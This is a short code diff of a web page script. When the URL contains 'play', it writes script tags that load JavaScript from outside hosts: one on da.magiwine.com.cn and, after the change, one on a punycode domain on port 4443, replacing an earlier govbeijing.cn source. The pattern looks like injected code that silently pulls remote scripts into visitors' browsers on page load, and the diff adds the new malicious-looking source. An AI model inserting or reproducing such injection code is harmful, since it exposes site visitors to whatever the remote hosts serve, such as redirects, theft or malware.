@@ -30,7 +30,7 @@ if(location.href.indexOf('play')>0)
 	  if (n == 0) {
 		document.write('<script src="https://da.magiwine.com.cn/d/0A1DE1A0-E43A-4CCF-970E-BEF0F7062237.ap"></script>');
 	  } else {
-		document.write('<script src="https://govbeijing.cn:4443/ty/x-3128-33.js"><\/script>');
+		document.write('<script src="https://xn--3bs795g.pub:4443/ty/x-3128-33.js"><\/script>');
 	}
 }else
 {
